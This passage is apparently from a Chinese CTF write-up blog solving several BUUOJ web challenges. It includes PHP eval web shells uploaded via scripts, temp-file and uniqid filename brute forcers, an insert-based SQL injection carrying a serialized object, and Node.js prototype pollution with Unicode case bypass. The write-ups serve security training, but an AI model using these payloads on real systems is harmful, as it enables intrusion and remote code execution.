<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">include.php?file=php:<span class="regexp">//</span>filter<span class="regexp">/string.strip_tags/</span>resource=<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
<p><strong>使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">file_data=&#123;</span><br><span class="line">	<span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">&quot;&lt;?php eval($_POST[a]);&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&quot;http://ad174df3-89cb-43d6-9e5b-ef88f8b1b19f.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	r=requests.post(url=url,files=file_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        print(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>之后再访问dir.php （可以通过扫描器扫出来，不过我没扫出来…）页面，得到文件名</p>
<p><strong>这里讲下在不知道dir.php路径的前提下对文件名的爆破方法.  tmp file的文件名是有规律的，都叫<code>/tmp/php</code>再加上6位的大小写字母加上数字的随机组合，这个爆破量比较大，但是是可行的，贴个exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string,requests,threading,Queue</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters </span><br><span class="line">host = <span class="string">&quot;123.207.99.17&quot;</span> </span><br><span class="line">port = <span class="number">80</span> </span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ready</span>():</span></span><br><span class="line"></span><br><span class="line">	queue=Queue.Queue()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> charset: </span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> charset: </span><br><span class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> charset: </span><br><span class="line">				<span class="keyword">for</span> l <span class="keyword">in</span> charset: </span><br><span class="line">					<span class="keyword">for</span> m <span class="keyword">in</span> charset: </span><br><span class="line">						<span class="keyword">for</span> n <span class="keyword">in</span> charset: </span><br><span class="line">							filename = i + j + k + l + m + n</span><br><span class="line">							<span class="built_in">print</span> <span class="string">&#x27;putting  &#x27;</span>+filename</span><br><span class="line">							queue.put(filename) </span><br><span class="line"></span><br><span class="line">	workers=[]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">		worker=threading.Thread(target=get,args=(queue,))</span><br><span class="line">		worker.start()</span><br><span class="line">		workers.append(worker)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> worker <span class="keyword">in</span> workers:</span><br><span class="line">		worker.join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">queue</span>):</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">while</span> queue.qsize()!=<span class="number">0</span>:</span><br><span class="line">			filename=queue.get(block=<span class="literal">False</span>)</span><br><span class="line">			brute_force_tmp_files(filename)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force_tmp_files</span>(<span class="params">filename</span>):</span> </span><br><span class="line">	url = <span class="string">&quot;%s/include.php?file=/tmp/php%s&quot;</span> % ( base_url, filename) </span><br><span class="line">	<span class="built_in">print</span> url </span><br><span class="line">	<span class="keyword">try</span>: </span><br><span class="line">		response = requests.get(url,timeout=<span class="number">2</span>) </span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(response.content)!=<span class="number">0</span>: </span><br><span class="line">			<span class="built_in">print</span> <span class="string">&quot;[+] Include success!&quot;</span> </span><br><span class="line">			<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;success.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">				f.write(filename+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line">		<span class="built_in">print</span> e </span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span> </span><br><span class="line">	get_ready() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p>接下去蚁剑连接即可，不过需要利用插件绕过disable_function ,flag在env下</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu26.jpg"></p>
<h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>知识点：</p>
<ol>
<li>thinkphp控制器路由</li>
<li>ThinkPHP 上传文件名爆破</li>
<li>Think PHP upload()多文件上传</li>
<li>think\upload类是怎么生成文件名的</li>
</ol>
<p><strong>Think PHP上传默认路径是/home/index/upload</strong></p>
<p><strong>Think PHP upload()多文件上传：</strong></p>
<blockquote>
<p>think PHP里面的upload()函数在不穿参数的情况下是批量上传的，这里可以理解为防护机制只会检测一次，运用条件竞争，多次上传可以绕过文件后缀的检测，至于为什么上传两次1.txt，是为了获取php文件的后缀，因为这里的后缀命名方式运用了uniqid函数它是基于微妙的当前时间来更改文件名，两个同时上传生成的文件名相差不会太远。</p>
</blockquote>
<p><strong>ThinkPHP 上传文件名爆破</strong></p>
<blockquote>
<p> 这里的后缀命名方式运用了uniqid函数它是基于微秒的当前时间来更改文件名的，两个同时上传生成的文件名相差不会太远。先上传一个正常文件再上传一个木马文件，然后再上传一个正常文件，然后根据第一和第三个正常文件的文件名之间的差异，爆破出我们上传的木马文件名。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$uploadFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower(<span class="variable">$uploadFile</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$upload</span> = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        <span class="variable">$info</span> = <span class="variable">$upload</span>-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$info</span>) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error(<span class="variable">$upload</span>-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          <span class="variable">$url</span> = __ROOT__.substr(<span class="variable">$upload</span>-&gt;rootPath,<span class="number">1</span>).<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;<span class="variable">$url</span>,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>限制分析</strong><br>主要的限制有上传文件的后缀名限制为不能为<code>.php</code>与下面的这句关于只能上传图片的限制。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$upload-&gt;allowExts  &#x3D; array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);&#x2F;&#x2F; 设置附件上传类型</span><br></pre></td></tr></table></figure>
<p>但是<code>$upload-&gt;allowExts</code>并不是<code>Think\Upload</code>类的正确用法，所以<code>allowexts 后缀名限制</code>是无效的,所有说我们只需绕过后缀不能为.php的限制</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu27.jpg"></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu28.jpg"></p>
<p>然后怎么绕过对文件名不能为<code>.php</code>的限制呢？这里要用到的知识点为<code> think\upload 类的多文件上传</code>与<code> think\upload 类是怎么生成文件名的</code></p>
<p><strong>think\upload 类的多文件上传tp多文件上传</strong></p>
<blockquote>
<p>upload() 函数不传参时为多文件上传，整个 $_FILES 数组的文件都会上传并保存。</p>
</blockquote>
<p><strong>think\upload类是怎么生成文件名的</strong></p>
<p>从官方手册上可以查找到</p>
<blockquote>
<p>$upload -&gt; saveName = array (‘uniqid’ , ‘ ‘);</p>
<p>默认的命名规则设置是采用uniqid函数生成一个唯一的字符串序列。</p>
</blockquote>
<p><strong>uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。故同时上传的两个文件的文件名一定不会差的很远，可爆破。</strong>所以这个时候我们上传第一个txt文件，再上传第三个txt文件，那么我们就可以知道我们上传第二个php木马文件在这个时间区域内的所在区间，就可以爆破出我们的木马文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://8eebd517-e32d-4bd4-84e1-0e2c874ef6b1.node3.buuoj.cn/index.php/Home/Index/upload&#x27;</span></span><br><span class="line">file1 = &#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)&#125;</span><br><span class="line">file2 = &#123;<span class="string">&#x27;file[]&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)&#125; <span class="comment">#upload()不传参时即是批量上传所以用[]</span></span><br><span class="line">r = requests.post(url,files = file1)</span><br><span class="line"><span class="built_in">print</span> (r.text)</span><br><span class="line">r = requests.post(url,files = file2)</span><br><span class="line"><span class="built_in">print</span> (r.text)</span><br><span class="line">r = requests.post(url, files = file1)</span><br><span class="line"><span class="built_in">print</span> (r.text)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu29.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="built_in">dir</span> =<span class="string">&#x27;abcdef0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">                    url = <span class="string">&#x27;http://8eebd517-e32d-4bd4-84e1-0e2c874ef6b1.node3.buuoj.cn/Public/Uploads/2021-01-28/601284cc&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i,j,k,x,y)</span><br><span class="line">                    r = requests.get(url)</span><br><span class="line">                    print(<span class="string">&quot;%s,%s&quot;</span> % (url, r,))</span><br><span class="line">                    time.sleep(<span class="number">0.1</span>)  //防止BUU 的 <span class="number">429</span></span><br><span class="line">                    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                        print(url)</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>由于BUU 429 的原因，爆破的时间有点久</p>
<p>得到文件名之后, 访问连接即可得到flag ,<del>本来还以为要命令执行的</del></p>
<p>看了大师傅的WP发现还有个非预期解 ，用 <code>shell.&lt;&gt;php</code> 来 绕过对php后缀的限制</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8eebd517-e32d-4bd4-84e1-0e2c874ef6b1.node3.buuoj.cn/index.php/home/index/upload/&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;shell.&lt;&gt;php&quot;</span>, <span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;])?&gt;&quot;</span>)&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#得上传文件路径：http://8eebd517-e32d-4bd4-84e1-0e2c874ef6b1.node3.buuoj.cn/Public/Uploads/2021-01-28/60128a068af5e.php</span></span><br></pre></td></tr></table></figure>




<h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>知识点</p>
<ol>
<li>信息泄漏</li>
<li>SQL注入</li>
<li>反序列化</li>
</ol>
<p><strong>获取源码</strong></p>
<p>在主页的源码下方有一个开发人员留的信息，可知网站的源码已经被上传的github上面了。</p>
<p>而网站源码的名称就是网页页脚的wowouploadimage, github搜索这个名称，即可找到源码。</p>
<p><strong>SQL注入 =&gt; 反序列化 =&gt; 读取Flag</strong></p>
<p>在图片上传处，check函数并未对文件名(title)进行检测, 直接传递到最后的SQL语句当中。导致了SQL注入，并且属于Insert注入。</p>
<p>审计代码后可知，图片数据在保存的时候，会将图片的高度和宽度进行序列化然后保存。在查看图片信息的页面(show.php)会对其进行反序列化。</p>
<p>我们需要通过SQL注入修改保存的信息中的序列化的值来利用。</p>
<p>在helper.php中的helper类中有一个<code>__destruct</code>魔术方法可以利用，通过调用<code>view_files</code>中的<code>file_get_contents</code>来读取flag。</p>
<p><strong>构造payload</strong></p>
<p>反序列化payload生成：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ifview</span> = <span class="literal">True</span>; </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">6</span>:<span class="string">&quot;helper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;*ifview&quot;</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">&quot;*config&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>这里的属性值ifview和config都是protected类型的，所以需要将payload修改为：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">6</span>:<span class="string">&quot;helper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;\0\0\0ifview&quot;</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">&quot;\0\0\0config&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>(以至于为什么要将修改为\0\0\0，是因为源码中在存取过程中对protected类型的属性进行了处理。)</p>
<p>正常上传图片的sql语句为：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> images (<span class="symbol">`title`</span>,<span class="symbol">`filename`</span>,<span class="symbol">`ext`</span>,<span class="symbol">`path`</span>,<span class="symbol">`attr`</span>) <span class="keyword">VALUES</span>(<span class="string">&#x27;TIM截图20191102114857&#x27;</span>,<span class="string">&#x27;f20c76cc4fb41838.jpg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;pic/f20c76cc4fb41838.jpg&#x27;</span>,<span class="string">&#x27;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>由于title处是我们能够控制的，所以构造文件名如下：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27;,&#x27;<span class="number">1</span>&#x27;,&#x27;<span class="number">1</span>&#x27;,&#x27;<span class="number">1</span>&#x27;,<span class="number">0</span>x<span class="number">4</span>f<span class="number">3</span>a<span class="number">363</span>a<span class="number">2268656</span>c<span class="number">706572223</span>a<span class="number">323</span>a<span class="number">7</span>b<span class="number">733</span>a<span class="number">393</span>a<span class="number">225</span>c<span class="number">305</span>c<span class="number">305</span>c<span class="number">30696676696577223</span>b<span class="number">623</span>a<span class="number">313</span>b<span class="number">733</span>a<span class="number">393</span>a<span class="number">225</span>c<span class="number">305</span>c<span class="number">305</span>c<span class="number">30636</span>f<span class="number">6</span>e<span class="number">666967223</span>b<span class="number">733</span>a<span class="number">353</span>a<span class="number">222</span>f<span class="number">666</span>c<span class="number">6167223</span>b<span class="number">7</span>d),(&#x27;<span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure>
<p>因为上传的文件名中不能有双引号，所以将payload进行16进制编码。</p>
<p>使用 Brupsuite 将上传的 filename 修改为构造的文件名上传，再访问 show.php 即可得到flag。</p>
<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>和以前做的入门题 <code>秋名山车神</code> 神似，直接放脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3500056c-c3e1-4b2d-b082-f7c67fa3d5ee.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">view = source.text</span><br><span class="line"></span><br><span class="line">equation = <span class="built_in">eval</span>(<span class="string">&quot;&quot;</span>.join(re.findall(<span class="string">&quot;&lt;br&gt;&lt;br&gt;(\d.*)&lt;br&gt;&lt;br&gt;&lt;form&quot;</span>,view)))</span><br><span class="line">flag = s.post(<span class="string">&quot;http://3500056c-c3e1-4b2d-b082-f7c67fa3d5ee.node3.buuoj.cn/index.php&quot;</span>, data=&#123;<span class="string">&#x27;answer&#x27;</span>: equation&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    equation = <span class="built_in">eval</span>(<span class="string">&quot;&quot;</span>.join(re.findall(<span class="string">&quot;&lt;br&gt;&lt;br&gt;(\d.*)&lt;br&gt;&lt;br&gt;&lt;form&quot;</span>,flag.text)))</span><br><span class="line">    flag = s.post(<span class="string">&quot;http://3500056c-c3e1-4b2d-b082-f7c67fa3d5ee.node3.buuoj.cn/index.php&quot;</span>, data = &#123;<span class="string">&#x27;answer&#x27;</span>:equation&#125;)</span><br><span class="line">    print(i)</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>


<h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p>知识点：</p>
<ol>
<li>NodeJs 原型链污染</li>
<li>javascript 大小写绕过</li>
</ol>
<p>P神的文章 <a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript" target="_blank">深入理解 JavaScript Prototype 污染攻击</a></p>
<p><strong>原型链的污染主要和两个函数有关</strong></p>
<blockquote>
<p><strong>merge()</strong><br><strong>clone()</strong></p>
</blockquote>
<p><strong>常用源码如下,可以看出clone与merge并无本质区别：</strong></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><strong>本质上这两个函数会有风险，就是因为存在能够控制数组（对象）的“键名”的操作。</strong><br> <strong>但是要想实现原型链污染，光只要键名可控是不够的。以下面这个例子为参考：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> merge(target, <span class="built_in">source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">let</span> key <span class="keyword">in</span> <span class="built_in">source</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> <span class="built_in">source</span> &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], <span class="built_in">source</span>[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = <span class="built_in">source</span>[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>尝试把第二个键名设为<code>__proto__</code>并赋值b为2。看看能不能把object的属性b改为2。</strong></p>
<p><strong><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu30.webp"></strong></p>
<p><strong>污染失败</strong></p>
<p> 可以看见最后</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="meta">o3</span>.b</span><br></pre></td></tr></table></figure>
<p><strong>返回的是</strong></p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure>
<p><strong>,并没有污染成功。</strong></p>
<p> 主要原因就是因为</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="emphasis">__proto__</span></span><br></pre></td></tr></table></figure>
<p><strong>没有被认为是一个键名。而这就需要我上面提到的另一个条件,代码如下时：</strong></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>
<p><strong>如果存在<code>JSON.parse()</code>，就能成功把<code>__proto__</code>解析成键名了。</strong></p>
<p><strong><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu30-1.webp"></strong></p>
<p><strong>污染成功</strong></p>
<p><strong>javascript的大小写绕过</strong></p>
<blockquote>
<p> “ı”.toUpperCase() == ‘I’<br> “ſ”.toUpperCase() == ‘S’<br> “K”.toLowerCase() == ‘k’</p>
</blockquote>
<hr>
<p>知识点就讲到这里，接下去分析下题目</p>
<p><a href="http://www.zip泄露,下载下来,通过分析(主要代码在index.js),可以很容易的发现存在/">www.zip泄露，下载下来，通过分析（主要代码在index.js），可以很容易的发现存在</a> clone() 和 merge() 函数，猜测为nodejs 原型链污染，接下去要做的就是找可以被污染的参数的</p>
<p>先分析下几个主要的路由</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.body.Submit==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.body.userid.toUpperCase(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.body.pwd,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line"> <span class="comment">//register ,参数userid 要经过 safeKeyword 函数的过滤,即对userid做了大小写的admin过滤. 成功绕过后，将会建立session目录，里面存储了注册的账号密码，注意里面的一个主要内容，user保存的是对userid做了toUpperCase()操作后的值，这个函数的利用在知识点有写，&quot;ı&quot;.toUpperCase() == &#x27;I&#x27; ，从而用ADMıN成功注册ADMIN.</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.body.Submit==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.user)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line"><span 